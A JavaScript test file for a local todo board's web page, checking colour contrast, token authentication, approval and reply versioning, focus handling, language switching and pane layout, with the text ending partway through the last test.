import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';
import * as i18n from '../todo/i18n.mjs';
import * as status from '../todo/status.mjs';

const source = readFileSync(new URL('../todo/page/app.js', import.meta.url), 'utf8');

function contrast(foreground, background) {
  const luminance = hex => {
    const rgb = hex.match(/[a-f\d]{2}/gi).map(pair => parseInt(pair, 16) / 255)
      .map(value => value <= 0.04045 ? value / 12.92 : ((value + 0.055) / 1.055) ** 2.4);
    return rgb[0] * 0.2126 + rgb[1] * 0.7152 + rgb[2] * 0.0722;
  };
  const a = luminance(foreground), b = luminance(background);
  return (Math.max(a, b) + 0.05) / (Math.min(a, b) + 0.05);
}

const css = readFileSync(new URL('../todo/page/app.css', import.meta.url), 'utf8');
const palettes = [...css.matchAll(/:root\s*\{([^}]+)\}/g)].map(match =>
  Object.fromEntries([...match[1].matchAll(/--([\w-]+):\s*(#[a-f\d]{6})/gi)].map(([, name, value]) => [name, value])));
for (const mode of ['light', 'dark']) {
  test(`S17: ${mode} text custom properties meet WCAG AA contrast`, () => {
    assert.equal(contrast('#000000', '#ffffff'), 21);
    assert.equal(contrast('#ffffff', '#ffffff'), 1);
    assert.equal(palettes.length, 2, 'read both light and dark palettes');
    const colors = { ...palettes[0], ...(mode === 'dark' ? palettes[1] : {}) };
    for (const background of ['paper', 'highlight']) {
      for (const foreground of ['ink', 'muted', 'control', 'accent', 'bad']) {
        const ratio = contrast(colors[foreground], colors[background]);
        assert.ok(ratio >= 4.5, `${mode} --${foreground} on --${background}: ${ratio.toFixed(3)}:1 < 4.5:1`);
      }
    }
    assert.ok(contrast(colors.bad, colors['bad-bg']) >= 4.5, `${mode} error notice text`);
    // Board surfaces: the canvas around it, cards, and the tint of the your-turn lane.
    for (const [foreground, background] of [['accent', 'highlight'], ['busy', 'busy-bg'], ['ok', 'ok-bg'], ['muted', 'open-bg'], ['bad', 'bad-bg'], ['busy', 'paper'], ['busy', 'highlight'],
      ['ink', 'card'], ['muted', 'card'], ['muted', 'canvas'], ['muted', 'lane-you'], ['accent', 'lane-you'], ['bad', 'lane-you'], ['busy', 'lane-you'], ['ok', 'card'], ['muted', 'paper']]) {
      const ratio = contrast(colors[foreground], colors[background]);
      assert.ok(ratio >= 4.5, `${mode} status --${foreground} on --${background}: ${ratio.toFixed(3)}:1 < 4.5:1`);
    }
  });
}

function page(hash = '', options = {}) {
  const nodes = new Map(), requests = [], streams = [];
  const node = id => {
    if (!nodes.has(id)) nodes.set(id, {
      dataset: {}, value: '', hidden: true, elements: [], children: [],
      attributes: {}, listeners: {}, classList: { contains() { return false; }, toggle() {}, add() {}, remove() {} },
      addEventListener(type, fn) { this.listeners[type] = fn; },
      focus() { context.document.activeElement = this; },
      showModal() { this.open = true; this.modal = true; },
      show() { this.open = true; this.modal = false; },
      close(value) { if (value !== undefined) this.returnValue = value; this.open = false; this.listeners.close?.(); },
      setAttribute(name, value) { this.attributes[name] = value; },
      matches() { return false; }, getClientRects() { return []; },
      insertBefore(child, before) {
        child.remove?.();
        const at = before ? this.children.indexOf(before) : -1;
        this.children.splice(at < 0 ? this.children.length : at, 0, child);
        child.parentElement = this;
      },
      remove() { this.parentElement?.children.splice(this.parentElement.children.indexOf(this), 1); this.parentElement = null; },
      append(...children) { this.children.push(...children); },
      replaceChildren(...children) { this.children = children; }
    });
    return nodes.get(id);
  };
  const location = new URL(`http://127.0.0.1:12345/${hash}`);
  const storage = () => {
    const values = new Map();
    return { getItem: key => values.get(key) ?? null,
      setItem: (key, value) => values.set(key, String(value)), removeItem: key => values.delete(key) };
  };
  let element = 0;
  const optionsHandler = options.fetch;
  const media = { matches: !!options.wide, listeners: [], addEventListener(type, fn) { this.listeners.push(fn); } };
  const context = vm.createContext({
    document: { getElementById: node, addEventListener() {}, documentElement: { lang: 'en' }, querySelectorAll: () => [],
      createElement: () => node(`element-${++element}`),
      createElementNS: () => node(`element-${++element}`), createTextNode: text => ({ textContent: text }) },
    sessionStorage: storage(), localStorage: storage(),
    history: { replaceState(_state, _title, url) { location.href = new URL(url, location).href; } },
    location, URLSearchParams, setTimeout, clearTimeout, Node: class {}, scrollX: 0, scrollY: 0, scrollTo() {}, matchMedia: () => media,
    // The browser imports these modules; the VM runs app.js as a script with their exports as globals.
    ...i18n, ...status,
    EventSource: class {
      constructor(url) { streams.push(url); }
      addEventListener() {}
    },
    fetch: async (url, options) => {
      requests.push({ url, options });
      if (optionsHandler) return optionsHandler(url, options);
      // Keep the initial load pending; this test exercises authentication, not DOM rendering.
      if (url === '/api/items') return new Promise(() => {});
      return { ok: true, text: async () => '{}' };
    }
  });
  vm.runInContext((options.source || source).replace(/^import .* from '\.\/(?:i18n|status)\.mjs';$/gm, ''), context);
  const setWide = wide => { media.matches = wide; for (const fn of media.listeners) fn({ matches: wide }); };
  return { context, nodes, requests, streams, location, setWide };
}

for (const reason of ['error', 'action', 'both']) {
  for (const view of ['list', 'detail']) {
    test(`S24: blocked ${view} shows the repair instruction from ${reason}`, () => {
      const p = page();
      vm.runInContext(`
        const repair = 'relative project path: write an absolute or ~/ path';
        const blocked = { id: 'abcdef', title: 'Broken project', status: 'blocked', done: false,
          project: './project', events: [], notes: [],
          error: ${reason !== 'action' ? 'repair' : 'undefined'},
          sdlc: ${reason === 'error' ? 'null' : `{ state: 'BLOCKED', action: ${reason === 'both' ? "'stale action'" : 'repair'} }`} };
        items = [blocked];
        const row = buildRow(blocked);
        updateRow(row, blocked);
        openDetail(blocked.id);
      `, p.context);
      const text = view === 'list' ? vm.runInContext('row._refs.info.children.map(n => n.textContent).join("\\n")', p.context)
        : p.nodes.get('detail-fields').children.map(n => n.textContent).join('\n');
      assert.match(text, /relative project path: write an absolute or ~\/ path/);
      assert.doesNotMatch(text, /Unknown|stale action/);
    });
  }
}

test('S24: a live item.error change refreshes the blocked list reason', () => {
  const p = page();
  const text = vm.runInContext(`
    const blocked = { id: 'abcdef', title: 'Broken project', status: 'blocked', error: 'first reason', events: [], notes: [] };
    const row = buildRow(blocked);
    updateRow(row, blocked);
    updateRow(row, { ...blocked, error: 'updated repair instruction' });
    row._refs.info.children.map(n => n.textContent).join('\\n');
  `, p.context);
  assert.match(text, /updated repair instruction/);
  assert.doesNotMatch(text, /first reason/);
});

for (const state of ['visible control', 'hidden mobile control', 'removed control', 'removed row']) {
  test(`S17: closing keyboard Details restores focus with ${state}`, () => {
    const p = page();
    vm.runInContext(`
      items = [{ id: 'abcdef', title: 'Keyboard item', status: 'workable', events: [], notes: [] }];
      const row = buildRow(items[0]);
      const control = row._refs.open;
      rows.set('abcdef', row);
      row.isConnected = ${state !== 'removed row'};
      control.isConnected = ${!state.startsWith('removed')};
      row.getClientRects = () => row.isConnected ? [{}] : [];
      control.getClientRects = () => ${state === 'hidden mobile control' ? 'document.activeElement === row' : 'control.isConnected'} ? [{}] : [];
      row.querySelector = () => control;
      control.focus = () => { if (control.isConnected && control.getClientRects().length) document.activeElement = control; };
      control.focus();
      openDetail('abcdef', control);
    `, p.context);
    p.nodes.get('detail-close').listeners.click();
    const expected = state === 'removed row' ? p.nodes.get('add-text')
      : vm.runInContext(state === 'removed control' ? 'row' : 'control', p.context);
    assert.ok(p.context.document.activeElement === expected, 'focus must return to a usable row control, row or add line');
    assert.equal(p.nodes.get('detail').open, false);
  });
}

for (const gate of ['', 'intent']) {
  test(`Details shows the work document of a waiting item ${gate ? 'with the decision form for its gate' : 'read-only for a question'}`, async () => {
    const p = page('#t=test-token', {
      source: source.replace("await import('./markdown.js')", '({ renderMarkdown: text => text })'),
      fetch: async url => url === '/api/items' ? new Promise(() => {}) : {
        ok: true, text: async () => JSON.stringify({ gate, file: '/p/.sdlc/work/x/intent.md', markdown: '# Scope', sha: 'a'.repeat(64) })
      }
    });
    vm.runInContext(`
      items = [{ id: 'abcdef', title: 'Waiting item', status: 'waiting', events: [], notes: [], project: '/p',
        sdlc: { slug: 'x', phase: 'intent', state: 'NEEDS-HUMAN', action: ${JSON.stringify(gate ? 'approve intent --human' : 'Which scope should ship?')} } }];
      openDetail('abcdef');
    `, p.context);
    await vm.runInContext('loadArtifact()', p.context);
    assert.ok(p.requests.some(r => r.url.startsWith('/api/artifact')), 'a question needs its intent to be answered');
    assert.equal(p.nodes.get('artifact-box').hidden, false);
    assert.equal(p.nodes.get('artifact-title').textContent, gate ? 'What you are asked to approve' : 'Work document');
    assert.equal(p.nodes.get('decide').hidden, !gate, 'only an approval gate offers the decision form');
  });
}

test('Details opens the brief of a plain item as a read-only document', async () => {
  const p = page('#t=test-token', {
    source: source.replace("await import('./markdown.js')", '({ renderMarkdown: text => text })'),
    fetch: async url => url === '/api/items' ? new Promise(() => {}) : {
      ok: true, text: async () => JSON.stringify({ gate: '', file: '/briefs/vendor.md', markdown: '# Brief', sha: 'a'.repeat(64) })
    }
  });
  vm.runInContext(`
    items = [{ id: 'abcdef', title: 'Choose a vendor', status: 'waiting', waiting: 'which vendor?', brief: '/briefs/vendor.md', events: [], notes: [], project: '', sdlc: null }];
    openDetail('abcdef');
  `, p.context);
  for (let i = 0; i < 5; i++) await new Promise(resolve => setImmediate(resolve));
  assert.ok(p.requests.some(r => r.url.startsWith('/api/artifact')), 'a brief is fetched without an sdlc slug');
  assert.equal(p.nodes.get('artifact-box').hidden, false);
  assert.equal(p.nodes.get('artifact-file').textContent, '/briefs/vendor.md');
  assert.equal(p.nodes.get('decide').hidden, true, 'a brief never offers approval');
});

test('Details text size steps by 10% between 80% and 160%', () => {
  const p = page('#t=test-token');
  const set = {};
  p.nodes.get('detail').style = { setProperty: (name, value) => { set[name] = value; } };
  for (let i = 0; i < 9; i++) p.nodes.get('text-larger').listeners.click();
  assert.equal(set['--detail-scale'], 1.6);
  assert.equal(p.nodes.get('text-larger').disabled, true, 'larger stops at 160%');
  for (let i = 0; i < 12; i++) p.nodes.get('text-smaller').listeners.click();
  assert.equal(set['--detail-scale'], 0.8);
  assert.equal(p.nodes.get('text-smaller').disabled, true, 'smaller stops at 80%');
});

test('B4: the page never uses Web Storage or cookies', () => {
  assert.equal(/\b(?:sessionStorage|localStorage)\b|\bcookie(?:Store)?\b/i.test(source), false,
    'app.js must not use browser storage or cookies');
});

test('B4: fragment token stays in the URL and authenticates requests and live updates after reload', async () => {
  const hash = '#t=0123456789abcdef0123456789abcdef&id=abcdef';
  for (let reload = 0; reload < 2; reload++) {
    const p = page(hash);
    await vm.runInContext('api("/api/probe", {text: "New item"})', p.context);
    const request = p.requests.find(r => r.url === '/api/probe');
    assert.equal(request.options.headers['X-Todo-Token'], '0123456789abcdef0123456789abcdef');
    assert.equal(request.options.headers['Content-Type'], 'application/json');
    assert.equal(p.streams[0], '/events?t=0123456789abcdef0123456789abcdef');
    assert.equal(p.location.hash, hash);
  }
});

test('B4: a page without a token explains how to open it without making requests', () => {
  const p = page();
  assert.equal(p.nodes.get('error-text').textContent,
    'Open the link printed in your terminal (or press w in the TUI)');
  assert.equal(p.nodes.get('error').hidden, false);
  assert.equal(p.requests.length, 0);
  assert.equal(p.streams.length, 0);
});

test('B1: pending delete confirmation submits the shown version even if the row is replaced', async () => {
  const p = page('#t=test-token');
  vm.runInContext(`
    const shown = { id: 'abcdef', title: 'Duplicate', version: 'shown-A' };
    const replacement = { id: 'abcdef', title: 'Duplicate', version: 'current-B' };
    const li = { dataset: { id: shown.id }, _item: shown };
    items = [shown];
    confirm = () => { items = [replacement]; li._item = replacement; return true; };
  `, p.context);
  await vm.runInContext('remove(li)', p.context);
  const body = JSON.parse(p.requests.find(r => r.url === '/api/item').options.body);
  assert.equal(body.id, 'abcdef');
  assert.equal(body.version, 'shown-A', 'confirmation must keep the item shown before the dialog');
});
test('B1: a changed-target response shows the server message and refreshes the snapshot', async () => {
  let loads = 0;
  const p = page('#t=test-token', { fetch: async url => {
    if (url === '/api/items') {
      if (++loads === 1) return new Promise(() => {});
      return { ok: true, text: async () => JSON.stringify({ items: [{ id: 'abcdef', version: 'current-B' }] }) };
    }
    return { ok: false, status: 409, text: async () => JSON.stringify({ error: 'This item changed. Reload and try again.' }) };
  } });
  vm.runInContext('apply = data => { items = data.items; return new Map(); };', p.context);
  await assert.rejects(vm.runInContext('mutate("/api/item", {id: "abcdef", version: "shown-A", op: "delete"})', p.context),
    /This item changed/);
  assert.equal(p.nodes.get('error-text').textContent, 'This item changed. Reload and try again.');
  assert.equal(p.nodes.get('error').hidden, false);
  assert.equal(loads, 2, '409 must reload current items');
  assert.equal(vm.runInContext('items[0].version', p.context), 'current-B');
});
test('N1: Done rows expose Details to audit their history', () => {
  const p = page();
  const row = vm.runInContext(`buildRow({ id: 'abcdef', done: true, title: 'Finished' })`, p.context);
  assert.equal(row._refs.open?.dataset.role, 'open', 'Done needs the same Details action as Open');
  assert.equal(row._refs.open?.textContent, 'Details');
});

test('B1: a reply draft keeps the version it was written for when a duplicate replaces the detail item', async () => {
  const p = page('#t=test-token');
  vm.runInContext(`detailId = 'abcdef'; items = [{ id: 'abcdef', version: 'shown-A' }];`, p.context);
  p.nodes.get('reply-text').value = 'Answer intended for A';
  p.nodes.get('reply-text').listeners.input();
  vm.runInContext(`items = [{ id: 'abcdef', version: 'current-B' }];`, p.context);
  await p.nodes.get('reply-form').listeners.submit({ preventDefault() {} });
  const body = JSON.parse(p.requests.find(r => r.url === '/api/item').options.body);
  assert.equal(body.version, 'shown-A', 'live details must not retarget a pending reply to B');
  assert.equal(body.text, 'Answer intended for A');
});

test('suggest: the reply field starts with the suggested answer; an edit stays, a new suggestion replaces an unedited one', async () => {
  const p = page('#t=test-token', { fetch: async url => url === '/api/items' ? new Promise(() => {}) : { ok: true, text: async () => '{}' } });
  vm.runInContext(`
    items = [{ id: 'abcdef', title: 'A20-1438', version: 'shown-A', done: false, status: 'waiting', waiting: 'q', suggest: 'HLS는 뺀다', events: [], notes: [] }];
    openDetail('abcdef');
  `, p.context);
  const field = p.nodes.get('reply-text');
  assert.equal(field.value, 'HLS는 뺀다');
  vm.runInContext(`items = [{ ...items[0], version: 'shown-B', suggest: 'HLS도 넣는다' }]; renderDetail();`, p.context);
  assert.equal(field.value, 'HLS도 넣는다', 'an unedited suggestion follows the agent');
  await p.nodes.get('reply-form').listeners.submit({ preventDefault() {} });
  const body = JSON.parse(p.requests.find(r => r.url === '/api/item').options.body);
  assert.deepEqual([body.text, body.version], ['HLS도 넣는다', 'shown-B'], 'sending as-is answers with the suggestion');
  vm.runInContext(`items = [{ ...items[0], version: 'shown-C', suggest: '세 번째' }]; renderDetail();`, p.context);
  field.value = '내 답';
  p.nodes.get('reply-text').listeners.input();
  vm.runInContext(`items = [{ ...items[0], version: 'shown-D', suggest: '네 번째' }]; renderDetail();`, p.context);
  assert.equal(field.value, '내 답', 'an edit is never overwritten');
});

test('choices: an open item offers one button per label, the pick first; a click posts the label as a reply', async () => {
  const p = page('#t=test-token', { fetch: async url => url === '/api/items' ? new Promise(() => {}) : { ok: true, text: async () => '{}' } });
  vm.runInContext(`
    items = [{ id: 'abcdef', title: '[결정 D35] A20-1462 · q', version: 'shown-A', done: false, status: 'waiting', waiting: '1) a · 2) b',
      choices: ['원래 있던 실패로 보고 진행', '심사 시험부터 고친 뒤 진행', '보류'], pick: 2, events: [], notes: [] }];
    openDetail('abcdef');
  `, p.context);
  const box = p.nodes.get('reply-choices');
  assert.equal(box.hidden, false);
  assert.deepEqual(box.children.map(b => b.textContent), ['심사 시험부터 고친 뒤 진행', '원래 있던 실패로 보고 진행', '보류']);
  assert.equal(box.children[0].className, 'primary choice');
  assert.equal(box.children[0].children[0].textContent, 'Recommended');
  await box.children[1].listeners.click();
  const body = JSON.parse(p.requests.find(r => r.url === '/api/item').options.body);
  assert.deepEqual(body, { id: 'abcdef', version: 'shown-A', op: 'reply', text: '원래 있던 실패로 보고 진행' });
  vm.runInContext(`items = [{ ...items[0], done: true, version: 'done-B' }]; renderDetail();`, p.context);
  assert.equal(box.hidden, true, 'a done item keeps its choices as history but shows no buttons');
});

test('choices: open items that need you and share a ticket link list together under its heading', () => {
  const p = page();
  const order = vm.runInContext(`
    const link = { label: 'A20-1462', url: 'https://jira/browse/A20-1462' };
    const ask = (id, extra = {}) => ({ id, title: id, done: false, status: 'waiting', waiting: 'q', events: [], notes: [], ...extra });
    apply({ items: [ask('d35', { link }), ask('other'), ask('busy', { link, status: 'workable' }), ask('d36', { link })] });
    document.getElementById('open').children.map(li => li._head ? 'head:' + li._heading.textContent : li.dataset.id);
  `, p.context);
  assert.deepEqual(order, ['head:A20-1462', 'd35', 'd36', 'other', 'busy']);
});

test('B1: approval sends the version of the item whose artifact was shown', async () => {
  const p = page('#t=test-token');
  vm.runInContext(`
    detailId = 'abcdef';
    artifact = { gate: 'intent', sha: 'a'.repeat(64), version: 'shown-A' };
    items = [{ id: 'abcdef', version: 'current-B' }];
  `, p.context);
  p.nodes.get('approve-words').value = 'Approve what I reviewed';
  await p.nodes.get('approve-form').listeners.submit({ preventDefault() {} });
  const body = JSON.parse(p.requests.find(r => r.url === '/api/approve').options.body);
  assert.equal(body.version, 'shown-A', 'approval binds the reviewed item as well as its artifact hash');
});


test('approval submits with a blank note', async () => {
  const p = page('#t=test-token');
  vm.runInContext(`
    detailId = 'abcdef';
    artifact = { gate: 'plan', sha: 'a'.repeat(64), version: 'shown-A' };
    items = [{ id: 'abcdef', version: 'shown-A' }];
  `, p.context);
  p.nodes.get('approve-words').value = '';
  await p.nodes.get('approve-form').listeners.submit({ preventDefault() {} });
  const sent = p.requests.find(r => r.url === '/api/approve');
  assert.ok(sent, 'a blank note must not block approval');
  assert.equal(JSON.parse(sent.options.body).words, '');
});

test('a multi-line reply or note is sent as one line, which the server and inbox require', async () => {
  const p = page('#t=test-token');
  vm.runInContext(`
    detailId = 'abcdef';
    artifact = { gate: 'plan', sha: 'a'.repeat(64), version: 'shown-A' };
    items = [{ id: 'abcdef', version: 'shown-A' }];
  `, p.context);
  p.nodes.get('reply-text').value = '  First line\r\n\n  second line \nthird  ';
  p.nodes.get('reply-text').listeners.input();
  await p.nodes.get('reply-form').listeners.submit({ preventDefault() {} });
  assert.equal(JSON.parse(p.requests.find(r => r.url === '/api/item').options.body).text, 'First line / second line / third');
  p.nodes.get('approve-words').value = 'Looks right\nship it';
  await p.nodes.get('approve-form').listeners.submit({ preventDefault() {} });
  assert.equal(JSON.parse(p.requests.find(r => r.url === '/api/approve').options.body).words, 'Looks right / ship it');
});

test('B1: an artifact response cannot replace the version of the item shown in Details', async () => {
  const p = page('#t=test-token', {
    // Stub only Markdown rendering; the real artifact request and item binding run in the VM.
    source: source.replace("await import('./markdown.js')", '({ renderMarkdown: text => text })'),
    fetch: async url => url === '/api/items' ? new Promise(() => {}) : {
      ok: true, text: async () => JSON.stringify({ gate: 'intent', markdown: '# Scope', sha: 'a'.repeat(64), version: 'server-B' })
    }
  });
  vm.runInContext(`detailId = 'abcdef'; items = [{ id: 'abcdef', version: 'shown-A' }];`, p.context);
  await vm.runInContext('loadArtifact()', p.context);
  assert.equal(vm.runInContext('artifact?.version', p.context), 'shown-A',
    'a concurrent target change during artifact loading must not grant a fresh version to stale Details');
});

for (const kind of ['reply', 'approve']) {
  for (const outcome of ['success', 'conflict', 'failure']) {
    test(`pending ${kind} ${outcome} keeps another item's Details draft and form`, async () => {
      let resolveRequest, loads = 0;
      const pending = new Promise(resolve => { resolveRequest = resolve; });
      const p = page('#t=test-token', { fetch: url => {
        if (url === (kind === 'reply' ? '/api/item' : '/api/approve')) return pending;
        if (url === '/api/items' && ++loads > 1) return { ok: true, text: async () => '{}' };
        return new Promise(() => {});
      } });
      vm.runInContext(`
        // Keep list rendering outside this dialog-handler regression.
        apply = () => new Map();
        items = ['aaaaaa', 'bbbbbb'].map(id => ({
          id, title: id, version: id + '-v1', status: 'workable', events: [], notes: []
        }));
        openDetail('aaaaaa');
        artifact = { gate: 'intent', sha: 'a'.repeat(64), version: 'aaaaaa-v1' };
      `, p.context);
      const field = p.nodes.get(kind === 'reply' ? 'reply-text' : 'approve-words');
      const draftKey = kind === 'reply' ? 'reply' : 'words';
      field.value = 'Draft for A';
      field.listeners.input();
      const submitted = p.nodes.get(`${kind}-form`).listeners.submit({ preventDefault() {} });
      const request = JSON.parse(p.requests.find(r => r.url === (kind === 'reply' ? '/api/item' : '/api/approve')).options.body);
      assert.equal(request.id, 'aaaaaa');
      p.nodes.get('detail-close').listeners.click();
      vm.runInContext(`
        openDetail('bbbbbb');
        artifact = { gate: 'intent', sha: 'b'.repeat(64), version: 'bbbbbb-v1' };
        $('decide').hidden = $('artifact-box').hidden = false;
        $('artifact-reload').hidden = true;
        $('approve-submit').disabled = false;
      `, p.context);
      field.value = 'Draft for B';
      field.listeners.input();
      field.focus();
      const count = p.nodes.get('approve-count').textContent;
      resolveRequest({
        ok: outcome === 'success', status: outcome === 'conflict' ? 409 : 500,
        text: async () => JSON.stringify(outcome === 'success' ? {} : { error: 'A request failed' })
      });
      await submitted;
      assert.equal(vm.runInContext(`draftFor('bbbbbb').${draftKey}`, p.context), 'Draft for B', 'B draft must survive A completion');
      assert.equal(field.value, 'Draft for B', 'B field must survive A completion');
      assert.equal(vm.runInContext(`draftFor('aaaaaa').${draftKey}`, p.context), outcome === 'success' ? '' : 'Draft for A');
      assert.equal(p.nodes.get('approve-count').textContent, count, 'B counter must stay unchanged');
      assert.equal(p.nodes.get(`${kind}-error`).hidden, true, 'A error must not appear on B');
      assert.equal(p.nodes.get('decide').hidden, false, 'B decision area must stay visible');
      assert.equal(p.nodes.get('artifact-box').hidden, false, 'B artifact must stay visible');
      assert.equal(p.nodes.get('artifact-reload').hidden, true, 'B must not offer to reload A');
      assert.equal(p.nodes.get('approve-submit').disabled, false, 'B approval must stay enabled');
      assert.equal(p.context.document.activeElement, field, 'A completion must not move focus on B');
    });
  }
}

test('language: the page follows the server language, switches at runtime and keeps the choice', () => {
  const other = i18n.languages.find(l => l !== i18n.defaultLanguage);
  const [en, ko] = [i18n.translator(i18n.defaultLanguage), i18n.translator(other)];
  const p = page('#t=test-token');
  const select = p.nodes.get('lang');
  assert.deepEqual(select.children.map(o => o.value), i18n.languages, 'switcher lists every registered language');
  const snapshot = lang => ({ lang, file: '/tmp/todo.md', items: [
    { id: 'aaaaaa', title: 'Plan gate', status: 'waiting', done: false, events: [], notes: [], project: '/p',
      sdlc: { slug: 'x', phase: 'plan', state: 'NEEDS-HUMAN', action: 'approve plan --human' } },
    { id: 'bbbbbb', title: 'Queued work', status: 'workable', done: false, events: [], notes: [], sdlc: { slug: 'y', phase: 'build' } }] });
  const texts = id => vm.runInContext(`rows.get('${id}')._refs.info.children.map(n => n.textContent).join('|')`, p.context);
  const line = id => vm.runInContext(`[...Object.values(rows.get('${id}')._refs)].filter(n => n && typeof n === 'object' && 'textContent' in n && !n.hidden).map(n => n.textContent).join('|')`, p.context);
  vm.runInContext(`received(${JSON.stringify(snapshot(other))})`, p.context);
  vm.runInContext(`openDetail('aaaaaa')`, p.context);
  assert.equal(p.context.document.documentElement.lang, other);
  assert.equal(select.value, other);
  assert.equal(p.nodes.get('counts').textContent, ko('page.counts', { you: 1, agent: 1, blocked: 0, done: 0 }));
  assert.match(texts('aaaaaa'), new RegExp(ko('status.approve-plan')));
  assert.match(texts('bbbbbb'), new RegExp(ko('status.agent')));
  assert.match(line('aaaaaa'), new RegExp(ko('stop.you')));
  assert.match(line('aaaaaa'), new RegExp(ko('action.approve-plan')));
  assert.match(texts('bbbbbb'), new RegExp(ko('row.queued')), 'rows below the stop say they wait for you');
  assert.equal(p.nodes.get('detail-fields').children[0].textContent, ko('field.status'));
  assert.equal(p.nodes.get('live-text').textContent, ko('live.connecting'));
  select.value = i18n.defaultLanguage;
  select.listeners.change();
  assert.equal(p.context.document.documentElement.lang, i18n.defaultLanguage);
  assert.equal(p.nodes.get('counts').textContent, '1 your turn · 1 agent · 0 blocked · 0 done');
  assert.match(texts('aaaaaa'), /Approve plan/);
  assert.match(line('aaaaaa'), /Agents stop here until you decide/);
  assert.match(line('aaaaaa'), /Approve…/);
  assert.match(texts('bbbbbb'), /Agent's turn/);
  assert.match(texts('bbbbbb'), /Queued behind your decision/);
  assert.equal(p.nodes.get('detail-fields').children[0].textContent, 'Status', 'open Details re-renders');
  assert.equal(p.nodes.get('live-text').textContent, 'Connecting');
  vm.runInContext(`received(${JSON.stringify(snapshot(other))})`, p.context);
  assert.equal(p.nodes.get('counts').textContent, en('page.counts', { you: 1, agent: 1, blocked: 0, done: 0 }), 'a live snapshot keeps the chosen language');
});

test('status names who acts next: not started, blocked and answer rows', () => {
  const p = page();
  const info = item => vm.runInContext(`(() => { const item = ${JSON.stringify(item)}; items = [item]; const row = buildRow(item); updateRow(row, item); return row._refs.info.children.map(n => n.textContent).join('|') + '#' + row.dataset.tone; })()`, p.context);
  assert.equal(info({ id: 'a1a1a1', title: 'New', status: 'workable', events: [], notes: [] }), 'Not started#open');
  assert.match(info({ id: 'b1b1b1', title: 'Q', status: 'waiting', waiting: 'Which DB?', events: [], notes: [] }), /^Answer needed#wait$/);
  assert.match(info({ id: 'c1c1c1', title: 'B', status: 'blocked', error: 'bad path', events: [], notes: [] }), /^Blocked — fix needed\|bad path#blocked$/);
});

const paneItems = () => [
  { id: 'aaaaaa', title: 'Agent task', status: 'workable', done: false, events: [], notes: [], sdlc: { slug: 'a', phase: 'build' } },
  { id: 'bbbbbb', title: 'Stop here', status: 'waiting', waiting: 'Which DB?', done: false, events: [], notes: [] },
  { id: 'cccccc', title: 'Queued task', status: 'workable', done: false, events: [], notes: [] }];
const receive = (p, list) => vm.runInContext(`received(${JSON.stringify({ lang: 'en', file: '/tmp/todo.md', items: list })})`, p.context);
const clickRow = (p, id, detail = 1) => vm.runInContext(`$('open').listeners.click({ detail: ${detail},
  target: { closest: selector => selector === 'li.row' ? rows.get('${id}') : null } })`, p.context);
const current = (p, id) => vm.runInContext(`rows.get('${id}').attributes['aria-current']`, p.context);

test('wide: Details is a side pane that shows the stop item until a row is chosen', () => {
  const p = page('#t=test-token', { wide: true });
  receive(p, paneItems());
  const dialog = p.nodes.get('detail');
  assert.equal(dialog.open, true);
  assert.equal(dialog.modal, false, 'the pane is not modal');
  assert.equal(p.nodes.get('detail-title').textContent, 'Stop here', 'nothing chosen: the row where agents stop');
  assert.equal(current(p, 'bbbbbb'), 'true');
  assert.equal(current(p, 'aaaaaa'), 'false');
  assert.notEqual(p.context.document.activeElement, p.nodes.get('detail-title'), 'a live update does not steal focus');
});

test('wide: clicking a row shows it in the pane; only keyboard activation moves focus there', () => {
  const p = page('#t=test-token', { wide: true });
  receive(p, paneItems());
  clickRow(p, 'cccccc');
  assert.equal(p.nodes.get('detail-title').textContent, 'Queued task');
  assert.equal(current(p, 'cccccc'), 'true');
  assert.equal(current(p, 'bbbbbb'), 'false');
  assert.notEqual(p.context.document.activeElement, p.nodes.get('detail-title'), 'a mouse click keeps focus in the list');
  vm.runInContext(`rows.get('aaaaaa').closest = selector => selector === 'li.row' ? rows.get('aaaaaa') : null;
    $('open').listeners.keydown({ target: rows.get('aaaaaa'), key: 'Enter', preventDefault() {} })`, p.context);
  assert.equal(p.nodes.get('detail-title').textContent, 'Agent task');
  assert.equal(p.context.document.activeElement, p.nodes.get('detail-title'), 'Enter on a row moves focus to the pane');
});

test('wide: the chosen item survives live snapshots and falls back when it disappears', () => {
  const p = page('#t=test-token', { wide: true });
  receive(p, paneItems());
  clickRow(p, 'cccccc');
  p.nodes.get('reply-text').value = 'draft for C';
  p.nodes.get('reply-text').listeners.input();
  receive(p, [{ id: 'dddddd', title: 'New first', status: 'waiting', done: false, events: [], notes: [] }, ...paneItems()]);
  assert.equal(p.nodes.get('detail-title').textContent, 'Queued task', 'a new stop item does not take over the pane');
  assert.equal(p.nodes.get('reply-text').value, 'draft for C');
  receive(p, paneItems().filter(item => item.id !== 'cccccc'));
  assert.equal(p.nodes.get('detail-title').textContent, 'Stop here');
  assert.equal(p.nodes.get('detail-gone').hidden, true);
  receive(p, []);
  assert.equal(p.nodes.get('detail').dataset.empty, 'true', 'an empty list shows the empty pane');
});

test('narrow keeps the modal; resizing moves the selection between modal and pane', () => {
  const p = page('#t=test-token', { wide: false });
  receive(p, paneItems());
  const dialog = p.nodes.get('detail');
  assert.equal(dialog.open, undefined, 'narrow screens do not open Details by themselves');
  clickRow(p, 'cccccc');
  assert.equal(dialog.open, undefined, 'a narrow row click does not open Details');
  vm.runInContext(`openDetail('cccccc')`, p.context);
  assert.equal(dialog.modal, true);
  p.setWide(true);
  assert.equal(dialog.open, true);
  assert.equal(dialog.modal, false, 'no modal stays over the two panes');
  assert.equal(p.nodes.get('detail-title').textContent, 'Queued task');
  p.setWide(false);
  assert.equal(dialog.open, false, 'the pane closes on a narrow screen');
  p.setWide(true);
  assert.equal(p.nodes.get('detail-title').textContent, 'Queued task', 'the selection is kept');
});

test('single window: a newer tray window asks older ones to close; its own or an older message does not', () => {
  const p = page();
  const channels = [];
  let closed = 0;
  p.context.close = () => { closed++; };
  p.context.FakeChannel = class {
    constructor(name) { this.name = name; this.listeners = []; channels.push(this); }
    addEventListener(type, listener) { if (type === 'message') this.listeners.push(listener); }
    // Like BroadcastChannel: every other channel of the same name receives it, the sender does not.
    postMessage(data) { for (const other of channels) if (other !== this && other.name === this.name) for (const fn of other.listeners) fn({ data }); }
  };
  const older = vm.runInContext('singleWindow(FakeChannel, true)', p.context);
  assert.equal(older.name, 'sdlc-todo-board');
  assert.equal(closed, 0, 'the first page stays');
  vm.runInContext('singleWindow(FakeChannel, true)', p.context);
  assert.equal(closed, 1, 'the older page closes when a newer one opens');
  for (const fn of older.listeners) fn({ data: { type: 'board-open', at: 0 } });
